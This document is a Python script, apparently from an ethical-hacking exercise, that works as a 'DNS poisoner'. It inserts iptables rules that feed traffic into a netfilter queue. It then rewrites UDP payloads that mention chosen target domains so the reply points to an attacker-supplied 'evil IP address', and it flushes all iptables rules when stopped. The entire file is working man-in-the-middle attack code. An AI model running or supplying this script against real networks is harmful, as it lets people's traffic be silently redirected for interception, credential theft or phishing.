#! /bin/python

import re
import subprocess
import time
from argparse import ArgumentParser

import scapy.all as scapy
from netfilterqueue import NetfilterQueue


def parse_cli_args():
    """Parse arguments from command-line interface."""
    parser = ArgumentParser(prog="DNS poisoner")
    parser.add_argument("-t", "--target-domains",
                        nargs='+',
                        required=True,
                        metavar="TARGET DOMAIN",
                        dest="targets",
                        help="Domain names that we want to poison",
                        type=str)
    parser.add_argument("-d", "--destined-domain",
                        nargs='?',
                        required=True,
                        metavar="DESTINATION IP ADDRESS",
                        dest="dest",
                        help="Our evil IP address that we want the victim to reach",
                        type=str)
    parser.add_argument("-l", "--local",
                        nargs='?',
                        metavar="TRUE",
                        dest="local",
                        help="Use this option if this script is run locally")
    return parser.parse_args()


# Parse CLI arguments
args = parse_cli_args()


def process_packet(packet):
    """A callback function to process a trapped packet."""
    # packet.get_payload() returns the payload as a string
    scapy_packet = scapy.IP(packet.get_payload())

    # Filter interesting packet only
    if scapy_packet.haslayer(scapy.UDP) and scapy_packet[scapy.UDP].sport == 9292:
        load = scapy_packet[scapy.Raw].load
        print "[+] Captured a packet whose payload is:\t", load
        malicious_load = load.split(';')
        if len(malicious_load) != 5:
            malicious_load = [load]

        for target in args.targets:
            if re.search(target, malicious_load[0]) is not None:
                if_target = True
                break
        else:
            if_target = False

        if if_target:
            malicious_load[-1] = args.dest
            malicious_load = ';'.join(malicious_load)

            print "[x] Poison the payload to:\t\t", malicious_load
            scapy_packet[scapy.Raw].load = malicious_load

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
        else:
            print "[-] Let it pass..."
    packet.accept()


### [MAIN ROUTINE] ###
# INPUT chain is used for packets coming in this machine
# OUTPUT chain is used for packets coming out this machine (after being altered)
# FORWARD chain is used for packets that go through this machine (in & out - after being altered)
if args.local is None:
    subprocess.call(
        "sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
else:
    subprocess.call(
        "sudo iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call(
        "sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)

try:
    queue = NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call("sudo iptables --flush", shell=True)
    print("[+] Flushing iptables...")
    time.sleep(2)
